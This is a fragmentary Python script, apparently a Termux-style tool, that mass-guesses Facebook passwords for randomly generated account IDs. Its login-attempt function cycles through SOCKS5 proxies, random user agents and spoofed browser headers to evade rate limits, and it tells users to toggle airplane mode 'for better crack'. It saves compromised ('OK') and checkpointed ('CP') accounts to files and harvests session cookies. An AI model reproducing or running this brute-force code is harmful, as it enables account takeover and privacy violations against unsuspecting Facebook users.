...
NameX =input('\033[1;97m[+]\033[1;92mTYPE  YOUR NAME  \033[1;91m: \033[1;96m')
#---------------------[LOOP MENU]---------------------#
loop = 0
cp = []
ok = []
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbfhteam(owners) JAMAL & H wii
...
def main():
    ...
    print(f"\033[1;97m[02] \033[1;92mJOIN TO TELEGRAM GROUP ")
    print(f"\033[1;97m[00] \033[1;92mEXIT ")
    print('\033[1;32m--------------------------------------------------------------') 
    JAMAL = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m")
    if JAMAL in ["1","01"]:
        passx()
    elif JAMAL in ["2","02"]:
        os.system("xdg-open https://https://t.me/Hadis_tech1")
        main()
    elif JAMAL in ["3","03"]:
        os.system("xdg-open G")
        main()
    elif JAMAL in ["0","00"]:
       exit()
    else:
...
def passx():
    ...
    print('\033[1;32m-----------------------------------------------------------') 
    print("\033[1;97m[01] \033[1;93m(RANDOM PASS)\033[1;95m     {V-SLOW-ON}")
    print("\033[1;97m[02] \033[1;93mRANDOM[2]  \033[1;95m       {FAST-ON}")
    print("\033[1;97m[03] \033[1;93mRANDOM[3]\033[1;95m     {FAST-ON}")
    print("\033[1;97m[04] \033[1;93mRANDOM[4]    \033[1;95m     {SLOW-ON}")


    print('\033[1;32m----------------------------------------------------------') 
    JAMAL = input("\033[1;37m[\033[1;32m!\033[1;37m]\033[1;37m SELECT METHOD \033[1;37m: \033[1;36m")
    if JAMAL in ["1","01"]:
        HADIS1()
    elif JAMAL in ["2","02"]:
        HADIS2()
...
def HADIS1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print('\033[1;32m-----------------------------------------------------') 
        print('    ON/OFF YOUR AIRPLANE MODE EVERY 5 SEC ')
        print('\033[1;32m-----------------------------------------------------') 
        for love in user:
            uid = code+love
...
def HADIS2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m----------------------------------------------------------') 
        print('    ON/OFF AIRPLANE MODE EVERY 5 SECOND FOR BETTER CRACK')
        print('\033[1;32m----------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan1234']
    ...
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/HADISOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/HADISCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
...
def HADIS10():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m    : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF AIRPLANE MODE FOR BETTER CRACK [Sayed Jamal]')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'10002000']
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            HADISl1 = ['fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.8']
            HADISt2 = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
            HADISc3 = ['"Android"', '"Windows"', '"Linux"']
            HADISm4 = ['POST', 'GET', 'path']
            HADISfetch2 = ['cros', 'navigate']
            HADISdest2 = ['empty', 'document']
            HADISr5 = ['https://t.facebook.com/', 'https://m.facebook.com/', 'https://p.facebook.com/', 'https://x.facebook.com/', 'https://d.facebook.com/']
            HADISs6 = ['"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"', '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"', '"Google Chrome";v="108", "Not)A;Brand";v="8", "Chromium";v="108"']
            HADISco7 = ['"dark"', '"light"']           
            HADISram9 = ['2', '3', '4', '6', '8', '10', '12']
            HADISau2 = ['m.facebook.com', 'mbasic.facebook.com', 'p.facebook.com', 'free.facebook.com']
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            pro = random.choice(ugen)   
            HADISl = random.choice(HADISl1)
            HADISt = random.choice(HADISt2)
            HADISc = random.choice(HADISc3)
            HADISm = random.choice(HADISm4)
            HADISr = random.choice(HADISr5)
            HADISs = random.choice(HADISs6)
            HADISco = random.choice(HADISco7)
            HADISfetch = random.choice(HADISfetch2)            
            HADISau = random.choice(HADISau2)
            HADISram = random.choice(HADISram9)
    ...
    'sec-fetch-user': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mCheckpoint_\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[HADIS] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
